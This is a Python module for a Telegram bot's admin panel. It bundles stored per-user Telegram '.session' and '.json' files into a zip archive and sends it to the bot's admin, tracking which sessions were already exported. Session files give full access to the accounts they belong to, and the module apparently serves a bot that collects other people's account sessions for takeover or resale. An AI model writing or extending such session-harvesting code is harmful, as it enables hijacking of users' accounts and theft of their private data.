from tgbot.dialogs.dialog import dialog, migrate
from tgbot.keyboards.keyboard import keyboard
from tgbot.services.get_text import gText
from tgbot.services.Session import ImportSession

from tgbot.states.State import State
from zipfile import ZipFile


async def export(message, state, repo, edit):
	title = '📤 Экспорт'
	text = [
		"Какие сессии экспортировать?"
	]
	markup = await keyboard.admin.export()
	await dialog(message, edit=edit, text=text, markup=markup, title=title)


async def export_new(message, state, repo, edit):
	await message.delete()
	ex = await get_export(repo)
	count = 0
	with ZipFile("sessions.zip", 'w') as newzip:
		for i in ex:
			if not i['export']:
				newzip.write(f'{i["session"]}.session')
				newzip.write(f'{i["session"]}.json')
				count += 1
				repo.storage[str(i['user_id'])]['export'] = True 
	with open('sessions.zip', 'rb') as file:
		text = f"Количество сессий в архиве - {count}"
		await message.bot.send_document(message.bot.config.admin, document=file, caption=text)



async def export_old(message, state, repo, edit):
	await message.delete()
	ex = await get_export(repo)
	count = 0
	with ZipFile("sessions.zip", 'w') as newzip:
		for i in ex:
			if i['export']:
				newzip.write(f'{i["session"]}.session')
				newzip.write(f'{i["session"]}.json')
				count += 1
				repo.storage[str(i['user_id'])]['export'] = True 
	with open('sessions.zip', 'rb') as file:
		text = f"Количество сессий в архиве - {count}"
		await message.bot.send_document(message.bot.config.admin, document=file, caption=text)


async def export_all(message, state, repo, edit):
	await message.delete()
	ex = await get_export(repo)
	count = 0
	with ZipFile("sessions.zip", 'w') as newzip:
		for i in ex:
				newzip.write(f'{i["session"]}.session')
				newzip.write(f'{i["session"]}.json')
				count += 1
				repo.storage[str(i['user_id'])]['export'] = True 
	with open('sessions.zip', 'rb') as file:
		text = f"Количество сессий в архиве - {count}"
		await message.bot.send_document(message.bot.config.admin, document=file, caption=text)


async def get_export(repo):
	result = []
	for i in repo.storage.keys():
		ex = repo.storage[i]
		if ex['session']:
			result.append(ex)
	return result


async def dialog_admin_export(state, message, current_state, repo, edit: bool=True):
	if current_state == State.admin.export.state:
		await export(message, state, repo, edit)
	elif current_state == State.admin.export_new.state:
		await export_new(message, state, repo, edit)
	elif current_state == State.admin.export_old.state:
		await export_old(message, state, repo, edit)
	elif current_state == State.admin.export_all.state:
		await export_all(message, state, repo, edit)